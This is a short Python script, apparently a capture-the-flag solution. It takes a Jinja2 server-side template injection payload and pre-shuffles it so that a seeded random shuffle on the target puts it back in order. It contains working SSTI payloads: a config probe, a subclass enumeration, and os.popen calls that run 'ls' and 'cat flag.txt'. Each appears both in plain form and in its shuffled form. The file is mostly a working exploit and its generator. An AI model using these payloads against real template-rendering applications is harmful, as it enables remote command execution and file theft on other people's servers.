import random

# string with known chars to reverse indexes
empty = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"§$%&/()=?*+~-_#.:,;[]{}ß@`´^°öäü'


# "randomly" jumble input
def get_jumbled(text):
    random.seed(0)
    jumbled = list(text)
    random.shuffle(jumbled)
    return ''.join(jumbled)

# allocate characters to certain positions in order to reverse it after jumble
def get_alloc(length):
    alloc = {}

    for i, char in enumerate(empty[:length]):
        alloc[char] = i

    return alloc


## SSTI input to generate pre-jumbled exploit 
ssti = '{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("cat flag.txt").read()}}'

## Used payloads:
# Payloads from https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python

## Check if SSTI works
# {{config}}
# gcinfo}{{}
# {{"".__class__.__mro__[1].__subclasses__()}}
# "_)_u_sccb_{sa__(1le_as.}s}r._s__{[o_.]l"m_s

## List files
# {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("ls").read()}}
# iTc_c)_els_eeltc_"oaals_fi.s_r.ep(t_(xrposoet).mn}oeR}p_ry_fe.a_ldb{c.nene"l{gel_..nte

## Read flag
# {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("cat flag.txt").read()}}
# a.e._)ee{ccsafeimt r_n_{ngptcc_il(ys.nrtoa"xl)oRl}_el}eps__e(.apxde_f_.l.c"tfetaorg.ene.__tToblt



jumbled = get_jumbled(empty[:len(ssti)])
# print(jumbled)

alloc = get_alloc(len(ssti))
# print(alloc)


## -- generate dictionary with correct index-positions --

out = {}

for i, char in enumerate(jumbled):
    out[str(alloc[char])] = ssti[i]


# -- Generate pre-jumbled ssti from allocation dictionary --

result = ''

for i in range(len(ssti)):
    result += out[str(i)]

print(result)